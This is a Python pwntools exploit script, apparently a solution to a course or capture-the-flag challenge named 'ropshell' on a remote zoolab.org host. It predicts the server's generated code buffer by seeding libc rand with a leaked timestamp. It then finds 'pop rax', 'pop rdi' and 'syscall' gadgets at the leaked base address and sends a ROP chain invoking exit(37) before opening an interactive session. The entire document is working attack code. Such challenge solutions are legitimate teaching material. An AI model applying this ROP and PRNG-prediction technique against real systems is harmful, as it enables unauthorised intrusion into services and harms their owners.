#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *
import ctypes
import struct

context.arch = 'amd64'
context.os = 'linux'

LEN_CODE = 10 * 0x10000

r = None
if 'qemu' in sys.argv[1:]:
    r = process("qemu-x86_64-static ./ropshell", shell=True)
elif 'bin' in sys.argv[1:]:
    r = process("./ropshell", shell=False)
elif 'local' in sys.argv[1:]:
    r = remote("localhost", 10494)
else:
    r = remote("up23.zoolab.org", 10494)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

# Get the timestamp
output = r.recvuntil(b"** Timestamp is ")
timestamp_line = r.recvline().decode()
timestamp = int(timestamp_line.strip())

# Get the base address
output = r.recvuntil(b"** Random bytes generated at ")
base_address_line = r.recvline().decode()
base_address = int(base_address_line.split()[-1], 16)

# Seed the random number generator with the timestamp
libc = ctypes.CDLL('libc.so.6')
libc.srand(timestamp)

# Generate the same sequence of random numbers as in the C program
codeint = []
for i in range(LEN_CODE // 4):
    rn = ((libc.rand() << 16) & 0xffffffff | (libc.rand() & 0xffff))
    codeint.append(rn.to_bytes(4, byteorder='little'))
random_index = libc.rand() % (LEN_CODE // 4 - 1)
codeint[random_index] = struct.pack("<I", 0xc3050f)
codeint = b''.join(codeint)


if codeint.find(asm("pop rax; ret")) != -1:
    pop_rax_ret = base_address + codeint.find(asm("pop rax; ret"))
else:
    raise ValueError("Assembly instruction 'pop rax; ret' not found in codeint!")

if codeint.find(asm("pop rdi; ret")) != -1:
    pop_rdi_ret = base_address + codeint.find(asm("pop rdi; ret"))
else:
    raise ValueError("Assembly instruction 'pop rdi; ret' not found in codeint!")

if codeint.find(asm("syscall; ret")) != -1:
    syscall_ret = base_address + codeint.find(asm("syscall; ret"))
else:
    raise ValueError("Assembly instruction 'syscall; ret' not found in code_bytes!")

# Print the base address and the positions of the gadgets
print(f"Base address: {hex(base_address)}")
print(f"Position of 'pop rax; ret': {hex(pop_rax_ret)}")
print(f"Position of 'pop rdi; ret': {hex(pop_rdi_ret)}")
print(f"Position of 'syscall; ret': {hex(syscall_ret)}")

payload = b""
payload += p64(pop_rax_ret) + p64(60)     
payload += p64(pop_rdi_ret) + p64(37)
payload += p64(syscall_ret) 
r.send(payload)


r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
